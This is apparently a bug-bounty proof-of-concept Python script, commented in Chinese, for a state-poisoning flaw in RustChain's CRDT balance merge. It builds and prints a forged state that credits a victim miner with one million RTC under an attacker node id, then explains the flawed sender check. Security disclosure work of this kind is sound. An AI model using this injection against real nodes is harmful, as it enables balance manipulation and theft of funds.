#!/usr/bin/env python3
"""
RustChain CRDT State Poisoning via Balance Merge
漏洞: #2867 (Security Audit)
奖励: 50 RTC (High)

攻击: 注入任意矿工余额
结果: 余额操纵，资金被盗
"""

import json

def exploit():
    # 攻击者 state
    malicious_state = {
        "balances": {
            "increments": {
                "victim_miner_id": {
                    "attacker_node_id": 1000000 * 100_000_000  # 100万 RTC
                }
            },
            "decrements": {}
        }
    }
    
    print("🎯 攻击 state:")
    print(json.dumps(malicious_state, indent=2))
    print()
    print("📊 代码错误:")
    print("  - 检查 node_map.get(sender)")
    print("  - sender = 攻击者的 node_id")
    print("  - 攻击者可以注入任意 miner 的余额")
    print()
    print("📊 影响:")
    print("  - 受害者余额增加 100万 RTC")
    print("  - 攻击者可重复注入")
    print("  - 共识基于 poisoned state")

if __name__ == "__main__":
    exploit()